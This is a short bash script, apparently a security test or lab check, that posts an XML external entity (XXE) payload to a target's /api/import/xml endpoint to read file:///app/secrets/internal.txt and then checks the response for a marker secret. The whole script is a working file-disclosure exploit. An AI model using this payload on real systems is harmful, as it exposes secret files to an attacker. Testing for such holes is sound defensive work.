#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
xml='<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///app/secrets/internal.txt">]><r>&xxe;</r>'
curl -fsS -X POST "$TARGET/api/import/xml" -H 'content-type: application/xml' --data "$xml" | grep -q 'SPRINGBOOT-INTERNAL-SINK-SECRET-2d9c'
